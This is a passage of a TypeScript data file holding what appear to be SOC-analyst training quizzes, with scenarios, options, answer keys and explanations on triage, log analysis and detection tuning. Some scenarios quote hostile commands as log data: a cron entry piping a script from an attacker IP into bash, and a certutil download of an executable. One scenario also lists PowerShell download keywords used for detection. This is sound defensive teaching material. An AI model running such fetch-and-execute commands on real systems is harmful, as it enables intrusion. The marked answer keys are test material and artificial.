export interface QuizQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  /** Optional scenario block rendered as monospace context above the question (logs, alerts, PCAP, etc.). */
  scenario?: string;
  /** Optional tags shown as small chips (e.g. MITRE tactic, tool, difficulty). */
  tags?: string[];
  /** Optional difficulty for filtering/balance. */
  difficulty?: "easy" | "medium" | "hard";
}

export interface QuizData {
  quizId: string;
  courseId: string;
  title: string;
  description: string;
  questions: QuizQuestion[];
  passingScore: number;
  timeLimit?: number; // in minutes
}

export const quizzes: QuizData[] = [
  {
    quizId: "q1",
    courseId: "soc-fundamentals",
    title: "SOC Operations: Triage & Decision Making",
    description: "Scenario-driven assessment covering SOC roles, escalation logic, metrics, and shift-handover decisions a Tier 1 analyst faces daily.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q1-1",
        difficulty: "easy",
        tags: ["SOC Roles", "Escalation"],
        scenario: "07:42 — You are the only Tier 1 analyst on shift. The SIEM fires three alerts within 30 seconds:\n  1) Brute-force lockout on a service account (low confidence)\n  2) EDR: suspicious child process spawned by winword.exe on FIN-HR-04\n  3) Failed login from a corporate VPN IP for the CFO\nA Tier 2 responder is online; the SOC Manager is in a meeting.",
        question: "Which alert should you triage FIRST, and what is the correct first action?",
        options: [
          "Alert 1 — reset the service account password immediately to stop the brute force.",
          "Alert 2 — isolate FIN-HR-04 via EDR while you investigate the parent/child chain.",
          "Alert 3 — call the CFO to verify the login before doing anything else.",
          "Work them in the order they arrived to maintain queue discipline."
        ],
        correctAnswer: 1,
        explanation: "Alert 2 has the highest potential impact: an Office process spawning a suspicious child is a classic macro/maldoc execution pattern (T1566.001 → T1059). Containment via EDR isolation buys time without destroying evidence. Alert 1 looks like a misconfigured service, Alert 3 is a single failed login. Resetting the service password (A) destroys context; calling the CFO first (C) wastes minutes during a possible active intrusion; FIFO triage (D) ignores severity — the cardinal sin of Tier 1."
      },
      {
        id: "q1-2",
        difficulty: "medium",
        tags: ["Metrics", "MTTD", "MTTR"],
        scenario: "Monthly SOC report:\n  • Avg time from log ingestion → alert fired: 4 min\n  • Avg time from alert fired → analyst acknowledges: 38 min\n  • Avg time from acknowledgement → containment: 22 min\n  • Avg time from containment → full recovery: 6 hours",
        question: "Which metric is the SOC's biggest weakness, and which control most directly improves it?",
        options: [
          "MTTD — invest in more detection rules and threat intel feeds.",
          "MTTA (acknowledgement) — review staffing levels, alert routing, and on-call rotations.",
          "MTTR — buy a faster EDR with auto-isolation.",
          "Recovery time — improve backup restoration speed."
        ],
        correctAnswer: 1,
        explanation: "Detection only took 4 minutes, but alerts sat unacknowledged for 38 minutes — that is a Mean Time To Acknowledge (MTTA) problem, almost always rooted in coverage gaps, noisy queues, or poor paging. Adding more rules (A) makes MTTA worse. Faster EDR (C) helps containment, not acknowledgement. Backups (D) address an entirely different phase."
      },
      {
        id: "q1-3",
        difficulty: "medium",
        tags: ["Tiering", "Handover"],
        scenario: "You (T1) have spent 35 minutes on an alert: a user reportedly clicked a phishing link and entered credentials. You confirmed the URL is malicious (VT 12/90), pulled mail headers, and disabled the account. The user mentions \"a weird popup asked me to run a PowerShell command — I did.\"",
        question: "What is the correct next step?",
        options: [
          "Close the case as contained — the account is disabled and the URL is blocked.",
          "Reset the user's password and reimage the workstation yourself to save time.",
          "Escalate to Tier 2 with a written handover: indicators, timeline, actions taken, and the new PowerShell execution detail.",
          "Email the user asking exactly what command they ran, then wait for their reply."
        ],
        correctAnswer: 2,
        explanation: "The phishing case has just expanded into possible host compromise (T1059.001 PowerShell). Tier 1 stops at suspected endpoint execution and hands off — but only with a structured handover so Tier 2 doesn't restart the investigation. Closing (A) is negligent; performing reimage yourself (B) breaks tiering and forensic chain of custody; waiting on the user (D) lets the attacker progress."
      },
      {
        id: "q1-4",
        difficulty: "easy",
        tags: ["SOC Models"],
        scenario: "A 400-person fintech runs business hours 09:00–18:00 IST. Compliance requires 24×7 monitoring, but the security budget supports only 3 internal analysts.",
        question: "Which SOC model best fits these constraints?",
        options: [
          "In-house 24×7 SOC — hire 5 more analysts to cover all shifts.",
          "Fully outsourced MSSP — terminate the internal team.",
          "Hybrid SOC — internal team owns business hours and tuning; MSSP covers nights/weekends.",
          "Virtual SOC with no dedicated staff — rely on automation only."
        ],
        correctAnswer: 2,
        explanation: "Hybrid is the standard fit for mid-size orgs needing 24×7 coverage without the headcount for it. Internal staff retain context and tuning ownership; the MSSP provides eyes-on-glass after hours. (A) blows the budget; (B) loses institutional knowledge; (D) ignores that automation alone cannot triage novel incidents."
      },
      {
        id: "q1-5",
        difficulty: "medium",
        tags: ["SIEM", "Alert Quality"],
        scenario: "Your SIEM rule \"Multiple Failed Logons\" fires 1,200 times/day. Investigation shows ~95% are from a vulnerability scanner and 4% from a misconfigured monitoring agent. Real incidents account for <1%.",
        question: "What is the BEST response?",
        options: [
          "Delete the rule — the signal is too noisy to be useful.",
          "Tune the rule: exclude the scanner and monitoring agent source IPs/accounts, and lower the threshold for everything else.",
          "Add a second analyst to the queue so all 1,200 alerts get reviewed.",
          "Increase the threshold from 5 failures to 500 so the rule rarely fires."
        ],
        correctAnswer: 1,
        explanation: "Allow-list known benign sources so the remaining signal is investigable — this preserves the detection while killing the noise. Deleting (A) loses a valid detection. Throwing analysts at noise (C) is the textbook cause of SOC burnout. Crudely raising the threshold (D) makes real brute-force attempts invisible."
      },
      {
        id: "q1-6",
        difficulty: "hard",
        tags: ["Severity", "Business Context"],
        scenario: "Two alerts at the same time:\n  A) Ransomware-style mass file rename on a developer's laptop (offline backups exist; user is on PTO).\n  B) Unusual outbound TLS to a newly-registered domain from the payment-processing server (handles live card transactions).",
        question: "Which incident is HIGHER severity for the business, and why?",
        options: [
          "A — ransomware is always P1 regardless of host.",
          "A — file encryption is irreversible without backups.",
          "B — a payment server beaconing to a new domain risks PCI scope, data exfiltration, and regulatory exposure even if dwell time is short.",
          "Both are equal; severity is determined only by the detection rule's confidence score."
        ],
        correctAnswer: 2,
        explanation: "Severity is impact × likelihood in business context, not the scariness of the alert name. Ransomware on a single offline-backed laptop with no active user is recoverable. A payment server contacting a newly-registered domain is a textbook C2/exfil pattern against a PCI-scoped asset — potential cardholder data loss and regulatory fines. (A)/(B) over-weight the malware label; (D) ignores asset criticality entirely."
      },
      {
        id: "q1-7",
        difficulty: "medium",
        tags: ["Playbooks", "Process"],
        scenario: "Your SOC has no playbook for \"suspected insider data theft.\" An alert fires: a departing employee downloaded 8 GB from SharePoint to a personal device 2 hours ago.",
        question: "What is the appropriate Tier 1 response?",
        options: [
          "Take no action — without a playbook, you have no authority to investigate.",
          "Improvise: disable the account, wipe the device, and email HR.",
          "Follow the closest applicable playbook (data exfiltration / account misuse), document every deviation, and immediately notify the SOC lead and HR/Legal.",
          "Open a low-severity ticket and wait for a playbook to be written."
        ],
        correctAnswer: 2,
        explanation: "Real SOCs never have a playbook for every scenario. Use the closest playbook as a scaffold, document deviations for post-incident review, and pull in HR/Legal early because insider cases have employment-law and evidence implications. (A) and (D) are negligent; (B) skips legal — wiping a personal device or unilaterally acting on a departing employee can create liability."
      },
      {
        id: "q1-8",
        difficulty: "hard",
        tags: ["False Positive vs True Positive"],
        scenario: "EDR alert: \"Credential dumping behavior on DC01\" — LSASS access by procdump.exe.\nFurther context: the change ticket CHG-4471 shows the AD team scheduled a memory capture for performance troubleshooting in this exact window. The user account matches a domain admin on the ticket.",
        question: "How do you classify and close this alert?",
        options: [
          "True Positive — any LSASS access is credential dumping; isolate DC01 immediately.",
          "False Positive — close with no notes since the change ticket explains it.",
          "Benign True Positive (or \"True Positive — Authorized\"): the behavior really happened and is malicious-looking, but is authorized; document the ticket reference, validate the executing user, and tune to suppress for future approved windows.",
          "Unknown — escalate to Tier 3 because LSASS is too risky to judge."
        ],
        correctAnswer: 2,
        explanation: "This is the classic Benign True Positive (BTP). The detection worked correctly — the activity matches credential dumping — but it is authorized. Closing as plain FP (B) destroys the audit trail and lets a real attacker hide behind future \"change windows.\" Always: verify the ticket, verify the user identity, document, and add a time-boxed tuning suppression. (A) ignores context; (D) escalates unnecessarily."
      },
      {
        id: "q1-9",
        difficulty: "medium",
        tags: ["Logging", "Visibility"],
        scenario: "During an investigation you need to know which process opened a specific outbound TCP connection on a Windows host 3 days ago. The host forwards: Security log, Application log, System log. EDR retention is 24 hours.",
        question: "What is the MOST likely outcome and the correct lesson learned?",
        options: [
          "The Security log will show the process — Windows logs process-to-network mapping by default.",
          "You will not recover this data; the gap is missing Sysmon (Event ID 3) and insufficient EDR telemetry retention. Recommend deploying Sysmon and extending EDR retention to ≥30 days.",
          "Pull the firewall log — it always includes the originating process name.",
          "Reconstruct from DNS logs — DNS responses include the process that requested them."
        ],
        correctAnswer: 1,
        explanation: "Out-of-the-box Windows does NOT log process→network mapping. Sysmon Event ID 3 is the standard control; without it, and with only 24h EDR retention, the data is gone. Firewall logs (C) see source IP/port, not process name. DNS responses (D) carry no process attribution. Recognizing telemetry gaps is a core SOC competency — the lesson is more important than the failed lookup."
      },
      {
        id: "q1-10",
        difficulty: "hard",
        tags: ["Communication", "Stakeholders"],
        scenario: "You are 90 minutes into an active incident. The CEO walks into the SOC and asks: \"Are we breached? Should I call the board?\"",
        question: "What is the correct response?",
        options: [
          "\"Yes, we're breached — start calling the board now.\" — be decisive.",
          "\"No, everything is under control.\" — avoid panicking leadership.",
          "\"We have a confirmed intrusion on two endpoints. Scope is still being determined; no evidence of data exfiltration yet. Next update in 30 minutes. The Incident Commander, not me, should drive board notification timing.\" — facts + scope + ETA + correct routing.",
          "\"I can't comment, please email the SOC inbox.\" — follow strict process."
        ],
        correctAnswer: 2,
        explanation: "Executives need three things: what is known, what is unknown, and when the next update is coming. Overstating (A) triggers premature regulatory disclosures; understating (B) destroys trust if proven wrong; refusing to communicate (D) drives executives to make decisions without you. Always route formal notifications through the Incident Commander to preserve a single source of truth."
      },
      {
        id: "q1-11",
        difficulty: "medium",
        tags: ["Shift Handover"],
        scenario: "End of your night shift. Open items:\n  • INC-204: ongoing phishing investigation, awaiting email gateway logs (ETA 09:00)\n  • INC-208: contained ransomware on one host, eradication pending\n  • 14 alerts in the triage queue, oldest is 11 minutes old",
        question: "Which handover entry is BEST for INC-208?",
        options: [
          "\"INC-208 — ransomware host, handled.\"",
          "\"INC-208 — host LAPTOP-22 isolated 03:14 IST via CrowdStrike. Hash a1b2... matches Lockbit variant in TI feed. User account disabled. Eradication (reimage + AD password reset) pending; ticket assigned to endpoint team. No lateral movement observed in last 4h. Action for day shift: confirm reimage complete and re-enable account after MFA reset.\"",
          "\"INC-208 — see ticket for details.\"",
          "\"INC-208 — ransomware. Day shift please take over.\""
        ],
        correctAnswer: 1,
        explanation: "A good handover is self-contained: what happened, what is done, what is pending, who owns it, and what the next shift must do. Vague entries (A/C/D) force the next analyst to restart the investigation — exactly the failure mode SOC handovers exist to prevent."
      },
      {
        id: "q1-12",
        difficulty: "hard",
        tags: ["Threat Intel", "Pyramid of Pain"],
        scenario: "A threat-intel partner shares three indicators tied to APT-X:\n  1) IP address 45.142.x.x (C2 server, observed last week)\n  2) SHA-256 of a custom loader DLL\n  3) TTP: scheduled task named \"OneDriveSync\" calling rundll32 with a .log extension",
        question: "Per the Pyramid of Pain, which indicator gives you the MOST durable detection value, and what should you do with it?",
        options: [
          "The IP — block it at the perimeter; attackers rarely change IPs.",
          "The file hash — add it to EDR blocklist; hashes never change.",
          "The TTP — write a behavioral detection (scheduled task + rundll32 + .log extension); attackers can rotate IPs and recompile binaries cheaply but changing their tradecraft is expensive.",
          "All three are equally durable; ingest them as-is into the SIEM."
        ],
        correctAnswer: 2,
        explanation: "David Bianco's Pyramid of Pain ranks indicators by how painful they are for the adversary to change. Hashes and IPs are trivially rotated; TTPs require re-tooling. The IP and hash still go into the SIEM/EDR (low cost, short-term win), but the high-value, long-lived detection is the behavioral one. (A)/(B) understate adversary agility; (D) misses the entire point of the model."
      }
    ]
  },
  {
    quizId: "q2",
    courseId: "soc-fundamentals",
    title: "Threat Landscape & Adversary Analysis",
    description: "Scenario-driven assessment on attribution, TTPs, MITRE ATT&CK mapping, and threat-actor decision making for Tier 1/2 analysts.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q2-1",
        difficulty: "medium",
        tags: ["Attribution", "APT", "TTPs"],
        scenario: "Your CTI team shares the following observations from a recent intrusion at a defense contractor:\n- Initial access: spear-phish (DOCX with macro) to a single engineering lead\n- C2: HTTPS beacon to a Cloudflare-fronted domain, 8h jitter, low-and-slow\n- Tooling: custom .NET loader, Cobalt Strike beacon, Mimikatz variant compiled in 2025\n- Dwell time before exfil: 47 days\n- Targeted data: CAD files and contract bids only",
        question: "Based on these observations, which actor class is the BEST fit and why?",
        options: [
          "Script kiddie — Cobalt Strike is freely available and the macro lure is generic",
          "Hacktivist — defense contractors are common political targets",
          "Financially motivated cybercrime — Mimikatz indicates credential theft for resale",
          "Nation-state / APT — patient dwell time, narrow target selection, custom tooling, and intellectual-property focus"
        ],
        correctAnswer: 3,
        explanation: "Long dwell time, surgical targeting (one engineer, one data type), bespoke loader, and theft of competitive IP — not credentials or money — are textbook APT indicators. Cobalt Strike + Mimikatz are commodity tools but the operational discipline (jitter, fronting, narrow scope) shows tradecraft beyond crimeware."
      },
      {
        id: "q2-2",
        difficulty: "medium",
        tags: ["MITRE ATT&CK", "Mapping"],
        scenario: "An analyst observes:\n  parent: outlook.exe -> child: winword.exe -> child: powershell.exe -hidden -enc <base64>\nNetwork: powershell.exe -> 185.x.x.x:443 (rare destination)",
        question: "Which ATT&CK technique chain BEST describes this behavior?",
        options: [
          "T1078 Valid Accounts -> T1021 Remote Services -> T1486 Impact",
          "T1566.001 Spearphishing Attachment -> T1204.002 User Execution -> T1059.001 PowerShell -> T1071.001 Web Protocols C2",
          "T1190 Exploit Public-Facing Application -> T1505.003 Web Shell",
          "T1110 Brute Force -> T1003 Credential Dumping"
        ],
        correctAnswer: 1,
        explanation: "Outlook spawning Word spawning encoded PowerShell that beacons out is the canonical phishing-attachment chain: delivery (T1566.001), user opens it (T1204.002), macro launches PowerShell (T1059.001), and C2 over HTTPS (T1071.001). Mapping observed telemetry to the exact ATT&CK IDs is a core Tier 1/2 skill."
      },
      {
        id: "q2-3",
        difficulty: "hard",
        tags: ["BEC", "Triage"],
        scenario: "At 09:14, the CFO forwards an email she 'thinks is suspicious.' The message is from cfo@yourcompany.co (note .co) and asks the AP clerk to push a $480k wire to a new vendor before EOD. Mail logs show the message was sent from 198.51.100.22 (Lithuania), SPF=fail, DMARC=quarantine but the gateway delivered it because the AP clerk's mailbox has an allow-list rule for 'cfo@yourcompany.*'.",
        question: "What is the MOST important immediate action?",
        options: [
          "Block the sender IP at the firewall and close the ticket",
          "Reply-all warning users not to click",
          "Confirm with AP that no wire has been initiated, then remove the over-broad allow-list rule and recall/quarantine the message tenant-wide",
          "Submit the domain to VirusTotal and wait for community votes"
        ],
        correctAnswer: 2,
        explanation: "BEC triage priority: (1) stop financial loss — verify no wire is in-flight, (2) eliminate the control gap that bypassed SPF/DMARC (the wildcard allow-list), (3) purge the message from all mailboxes. Firewall IP blocks are nearly useless for email; the cheap fix is fixing the mail rule and recalling the message."
      },
      {
        id: "q2-4",
        difficulty: "medium",
        tags: ["Supply Chain", "Risk"],
        scenario: "Your vulnerability feed reports that a popular JS package your e-commerce site loads via CDN had a malicious version published last night that exfiltrates form data. Your site pins '^1.2.0' and rebuilds nightly.",
        question: "Which response is correct AND properly scoped?",
        options: [
          "No action — CDN providers handle this",
          "Pin to the last known-good exact version, force-deploy, then review CSP and SRI to detect/prevent loaded-script tampering",
          "Disable the entire site until the package author replies",
          "Block the CDN domain at the firewall"
        ],
        correctAnswer: 1,
        explanation: "Caret-range pinning (`^1.2.0`) auto-upgrades and is the actual root cause. Pin exact, redeploy, and add Subresource Integrity (SRI) + Content-Security-Policy so a future tampered script can't execute. This is the SolarWinds / event-stream class lesson."
      },
      {
        id: "q2-5",
        difficulty: "hard",
        tags: ["Insider Threat", "Behavioral"],
        scenario: "A senior developer in his notice period:\n- Logged in at 02:30 on a Sunday (first time ever off-hours)\n- Cloned 14 private repos to a personal laptop via GitHub PAT\n- Sent 6 GB to a personal Google Drive 12 minutes later\n- Has legitimate access to every repo touched",
        question: "How should you classify this and what is the right first action?",
        options: [
          "False positive — he has access, so it is not a policy violation",
          "True positive insider data exfiltration — preserve evidence, revoke the PAT and SSO session, engage HR and legal BEFORE confronting the user",
          "Malware infection — start IR and reimage his laptop",
          "Benign — wait until Monday and ask him about it"
        ],
        correctAnswer: 1,
        explanation: "Authorized access does not equal authorized use. The off-hours pattern + bulk clone + immediate cloud upload + notice-period context is classic intentional exfiltration. The procedural order matters: evidence first, contain identity, loop HR/legal — never tip off the subject."
      },
      {
        id: "q2-6",
        difficulty: "medium",
        tags: ["Credential Attacks"],
        scenario: "Azure AD sign-in logs over 1 hour:\n- 14,200 failed logins\n- Across 9,800 distinct usernames\n- Same 3 passwords tried: 'Winter2026!', 'Company@123', 'Welcome1'\n- Source: 4 residential proxy ASNs",
        question: "This is BEST described as which attack, and which control most directly mitigates it?",
        options: [
          "Brute force on one account — enable account lockout",
          "Credential stuffing — enable MFA and breach-password screening",
          "Password spraying — enable MFA, risk-based conditional access, and ban common passwords",
          "Phishing — deploy email banner warnings"
        ],
        correctAnswer: 2,
        explanation: "Few passwords across many accounts = spraying (designed to stay below per-account lockout). Stuffing would use leaked username:password pairs (1:1). MFA + conditional access on impossible travel/unfamiliar location + banned-password lists are the mitigations the framework explicitly recommends."
      },
      {
        id: "q2-7",
        difficulty: "hard",
        tags: ["Pyramid of Pain", "CTI"],
        scenario: "After containing an intrusion, you have these artifacts:\n  A) MD5 of dropper: 5d41402abc4b2a76b9719d911017c592\n  B) C2 IP: 203.0.113.45\n  C) C2 domain: secure-update[.]net\n  D) Tool: 'Cobalt Strike Malleable C2 profile mimicking Office365 traffic'\n  E) TTP: 'phishing -> macro -> PowerShell -> CS beacon over HTTPS jitter 30%'",
        question: "Which artifact would cause the MOST 'pain' to the adversary if you block/detect on it, per the Pyramid of Pain?",
        options: [
          "A — hashes are the foundation of detection",
          "B — IPs are infrastructure and hard to change",
          "C — domains require DNS registration",
          "E — TTPs sit at the top; forcing the adversary to change behavior is far harder than rotating a hash, IP, or domain"
        ],
        correctAnswer: 3,
        explanation: "Bianco's Pyramid of Pain: hashes/IPs/domains are trivial-to-easy to rotate; tools annoying; TTPs are 'tough!' because they force the adversary to rebuild tradecraft. Tier 2/3 detection engineering should prioritize behavioral signatures over IOCs."
      }
    ]
  },
  {
    quizId: "q3",
    courseId: "soc-fundamentals",
    title: "Log Analysis & Triage Challenge",
    description: "Hands-on triage using real Windows, Linux, and proxy/firewall log excerpts.",
    passingScore: 75,
    timeLimit: 30,
    questions: [
      {
        id: "q3-1",
        difficulty: "medium",
        tags: ["Windows", "EventID 4625", "Brute Force"],
        scenario: "Security.evtx excerpt:\n  04:12:01  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  04:12:03  4625  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21  Status=0xC000006A\n  ... (192 entries over 6 minutes, same source, same account)\n  04:18:11  4624  TargetUser=svc_backup  LogonType=3  Source=10.0.5.21",
        question: "What occurred?",
        options: [
          "Service restart loop — benign",
          "Successful brute force / password guess against the svc_backup service account from an internal host",
          "Kerberos ticket expiration",
          "Logon type 3 cannot brute force; ignore"
        ],
        correctAnswer: 1,
        explanation: "Status 0xC000006A = wrong password. 192 failures from one source against one account followed by a 4624 success is unambiguous credential guessing — and the source is INTERNAL (10.0.5.21), suggesting lateral movement or a compromised host. Service accounts are juicy because they often have stale passwords and broad rights."
      },
      {
        id: "q3-2",
        difficulty: "hard",
        tags: ["Linux", "auth.log", "Persistence"],
        scenario: "/var/log/auth.log:\n  Mar 14 23:01 sshd[2210]: Accepted publickey for root from 198.51.100.7 port 51220\n  Mar 14 23:01 sudo: root : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/crontab -e\n  Mar 14 23:02 systemd: Started Session 88 of user root.\nAnd `crontab -l` now shows:\n  */5 * * * * curl -s http://198.51.100.7/u | bash",
        question: "What is the correct classification and immediate containment?",
        options: [
          "Routine admin work — root logged in legitimately",
          "Confirmed compromise + persistence: rogue cron pulling shell from attacker IP. Isolate the host, capture memory, kill cron entry, rotate keys, hunt for the same IP/key elsewhere",
          "Misconfigured monitoring — silence the alert",
          "Phishing — notify users"
        ],
        correctAnswer: 1,
        explanation: "Direct root SSH from an external IP + immediate cron persistence beaconing to that same IP is textbook initial-access + T1053.003 (Cron) persistence. Containment must preserve evidence (memory + auth.log + cron) before remediation, and the hunt step (same key / IP across other hosts) is what separates a real responder from someone who just deletes the cron."
      },
      {
        id: "q3-3",
        difficulty: "medium",
        tags: ["Proxy", "Beaconing"],
        scenario: "Squid access.log — same client, 24h:\n  Requests to https://cdn-metrics[.]xyz/collect: 288\n  Mean interval: 300s, std-dev: 4s\n  Bytes out per request: ~1.2 KB, bytes in: 96 B",
        question: "What pattern is this and what is the correct next step?",
        options: [
          "Normal analytics — close ticket",
          "C2 beaconing (low jitter, periodic, small uplink): pivot on the destination across all endpoints, look up domain age/registration, sandbox the URL, and check the host process making the requests",
          "DDoS — block at firewall",
          "Software update check — ignore"
        ],
        correctAnswer: 1,
        explanation: "Tight periodicity (300s ± 4s) with asymmetric small payloads is the signature of automated beaconing, not human or analytics traffic. The pivot pattern (other clients hitting the same destination, domain WHOIS age, process attribution via EDR) is the standard hunt loop."
      },
      {
        id: "q3-4",
        difficulty: "hard",
        tags: ["Windows", "Sysmon", "LOLBin"],
        scenario: "Sysmon Event ID 1:\n  Image: C:\\Windows\\System32\\certutil.exe\n  CommandLine: certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  User: CORP\\jdoe",
        question: "What is happening?",
        options: [
          "Routine certificate validation",
          "Living-off-the-land download (T1105 Ingress Tool Transfer) using certutil as a downloader; high severity — investigate the parent shell origin and quarantine p.exe",
          "Windows Update activity",
          "Antivirus signature refresh"
        ],
        correctAnswer: 1,
        explanation: "certutil with -urlcache -split -f is a well-known LOLBin pattern to fetch a remote payload while bypassing some egress monitoring. Map to T1105 + T1218 abuse. Pivot to discover what spawned cmd.exe — that's often the real entry point."
      },
      {
        id: "q3-5",
        difficulty: "medium",
        tags: ["Firewall", "Data Exfil"],
        scenario: "Palo Alto traffic log, single internal workstation, last hour:\n  app=dns  dst=8.8.8.8  bytes_out=412,000,000  sessions=14,902  avg_query_len=180\n  app=web-browsing dst=mixed bytes_out=2,100,000",
        question: "What is the likely activity?",
        options: [
          "Heavy web browsing — normal",
          "DNS tunneling / exfiltration over port 53 (T1071.004 / T1048): unusually large DNS volume with long query names; isolate host and capture pcap",
          "DNS cache poisoning",
          "Normal patching activity"
        ],
        correctAnswer: 1,
        explanation: "412 MB of outbound DNS in an hour with 180-byte average query length is far outside normal. DNS is rarely inspected and frequently allowed outbound — making it the favorite covert channel. The correct response is host isolation + packet capture for forensics, plus a DNS-volume detection going forward."
      },
      {
        id: "q3-6",
        difficulty: "hard",
        tags: ["Correlation"],
        scenario: "Three alerts within 14 minutes from the SAME endpoint (HOST-44):\n  A) EDR: suspicious WMI subscription created\n  B) AD: HOST-44$ enumerated all Domain Admins via LDAP\n  C) Firewall: SMB (445/tcp) to 23 other internal hosts that HOST-44 has never talked to before",
        question: "What is the BEST interpretation?",
        options: [
          "Three unrelated low-severity events",
          "Active intrusion with WMI persistence (T1546.003) + discovery (T1087.002) + lateral movement (T1021.002). Escalate to IR immediately and isolate HOST-44",
          "Vulnerability scanner activity",
          "Sysadmin doing inventory"
        ],
        correctAnswer: 1,
        explanation: "Individually these are 'meh.' Correlated they form Persistence -> Discovery -> Lateral Movement on the kill chain — the unmistakable middle game of a real intrusion. SOC value lives in correlation, not single-alert handling."
      }
    ]
  },
  {
    quizId: "q4",
    courseId: "soc-fundamentals",
    title: "SIEM & Alert Triage in Practice",
    description: "Scenario quiz on writing, tuning, and triaging SIEM detections.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q4-1",
        difficulty: "medium",
        tags: ["Tuning", "False Positives"],
        scenario: "Detection 'Mass File Access' fires 480 times/day. Review shows 96% come from three backup service accounts running nightly snapshots and the SCCM scanner.",
        question: "What is the correct tuning approach?",
        options: [
          "Disable the rule",
          "Raise severity so analysts pay attention",
          "Add a precise allow-list (the named service accounts + scheduled time window) and keep the rule active for everyone else; document the suppression with an expiry/review date",
          "Mute the user mailbox of whoever complained"
        ],
        correctAnswer: 2,
        explanation: "Good tuning suppresses *only* the known-benign context (named accounts + time window), not the entire rule. Always document suppressions with an owner and review date so they don't become permanent blind spots."
      },
      {
        id: "q4-2",
        difficulty: "hard",
        tags: ["Splunk", "SPL"],
        scenario: "You need to detect users authenticating from two different countries within 1 hour ('impossible travel').",
        question: "Which Splunk approach is MOST correct?",
        options: [
          "`index=auth | stats count by user` and review manually",
          "`index=auth action=success | iplocation src_ip | stats dc(Country) as countries values(Country) as c values(src_ip) as ips by user _time | where countries>1`",
          "`index=auth | bin _time span=1h | iplocation src_ip | stats dc(Country) as countries by user, _time | where countries>1`",
          "`index=auth | head 100`"
        ],
        correctAnswer: 2,
        explanation: "Option C buckets time into 1h windows BEFORE counting distinct countries per user — the correct semantic for 'within 1 hour.' Option B without a time bucket lumps the whole search range and produces noisy true-but-useless positives. Detection engineering requires the query to match the English."
      },
      {
        id: "q4-3",
        difficulty: "medium",
        tags: ["Triage", "Severity"],
        scenario: "Three alerts hit your queue simultaneously at 14:00:\n  1) IDS: Nmap SYN scan from 192.0.2.10 -> 10.0.0.0/24\n  2) EDR: ransomware behavioral block on FIN-DB-01 (production financial DB)\n  3) DLP: 1 customer record copied to USB on HR laptop",
        question: "Correct triage order?",
        options: [
          "1, 2, 3 — chronological",
          "2, 3, 1 — by impact: production DB ransomware first, DLP next, recon last",
          "3, 1, 2 — alphabetical",
          "Work whichever has fewest fields to read"
        ],
        correctAnswer: 1,
        explanation: "Ordering by business impact (and reversibility) is the analyst's primary triage skill. Active ransomware on a financial system is potentially catastrophic and time-critical; recon is informational and can wait. Severity in the queue rarely matches reality — analyst judgement does."
      },
      {
        id: "q4-4",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "A new detection 'Encoded PowerShell' fires on:\n  powershell.exe -enc <base64>\nAfter 2 weeks: 1,400 fires, 1,392 from a legitimate SCCM client-action script.",
        question: "What is the BEST evolution of the rule (not just a suppression)?",
        options: [
          "Delete it; too noisy",
          "Refine to fire only when the encoded payload decodes to known-suspicious indicators (DownloadString, IEX, Invoke-WebRequest, FromBase64String chained) AND the parent is NOT the known SCCM agent; keep the SCCM hash on an allow-list with review",
          "Lower the severity to informational and ignore",
          "Move it to a different SIEM"
        ],
        correctAnswer: 1,
        explanation: "Detection engineering > alert handling. The strongest detections combine a behavioral signal (suspicious decoded content), a context filter (parent process), and a maintainable allow-list. Deleting noisy rules surrenders coverage; suppressing them blindly creates blind spots."
      },
      {
        id: "q4-5",
        difficulty: "medium",
        tags: ["Metrics", "SLA"],
        scenario: "Quarterly metrics:\n  MTTD: 14 min  MTTA: 47 min  MTTR: 2 h 30 min\n  Analyst headcount: unchanged.  Alert volume: +60%.",
        question: "Which metric points to the most actionable problem?",
        options: [
          "MTTD — detections are slow",
          "MTTA — alerts are sitting in the queue 47 minutes before anyone touches them; symptom of capacity vs. volume mismatch. Address with tuning, automation, or staffing",
          "MTTR — incidents take too long to close",
          "Headcount is irrelevant"
        ],
        correctAnswer: 1,
        explanation: "MTTD is healthy (detections fire quickly). MTTA being the long pole means alerts are queueing — the lever is reducing volume (tuning), increasing throughput (SOAR/automation), or adding analysts. Knowing which metric to act on is more valuable than memorizing definitions."
      },
      {
        id: "q4-6",
        difficulty: "hard",
        tags: ["Use Case Lifecycle"],
        scenario: "Your SOC manager asks you to propose a NEW detection use case for 'OAuth consent phishing in M365.'",
        question: "Which response best follows the use-case lifecycle?",
        options: [
          "Write a rule that fires on every OAuth grant",
          "1) Hypothesis (illicit consent grants to risky apps), 2) Data source check (AAD AuditLogs: 'Consent to application'), 3) Logic (publisher unverified OR risky scopes like Mail.ReadWrite by non-admin), 4) Validation in dev, 5) Tuning baseline, 6) Runbook + handoff to ops",
          "Ask the vendor to build it",
          "Block all OAuth apps"
        ],
        correctAnswer: 1,
        explanation: "Mature detection programs follow a lifecycle: hypothesis -> data availability -> logic -> validation -> tuning -> documentation. Skipping any step is how you get rules nobody trusts or knows how to triage."
      }
    ]
  },
  {
    quizId: "q5",
    courseId: "soc-fundamentals",
    title: "Threat Intelligence in Action",
    description: "Scenario quiz on applying CTI to detection, triage, and decisions.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q5-1",
        difficulty: "medium",
        tags: ["IOC Lifecycle"],
        scenario: "A vendor IOC feed pushes 80,000 IPs/day. You ingest them all as blocklists. Within a week, you see business outages from blocked legitimate services.",
        question: "What was the core mistake?",
        options: [
          "Using a vendor feed at all",
          "Treating raw, low-confidence, short-lived indicators as enforcement data without scoring, dedup, source reputation, and expiry — IOCs need a lifecycle (ingest -> score -> act -> age out)",
          "Not buying more feeds",
          "Blocking IPs is always wrong"
        ],
        correctAnswer: 1,
        explanation: "Mature CTI applies confidence scoring (TLP, source rep), an action tier (alert vs. block), and an expiry policy. Raw firehose feeds belong in detection/enrichment first, enforcement only after scoring."
      },
      {
        id: "q5-2",
        difficulty: "hard",
        tags: ["Diamond Model"],
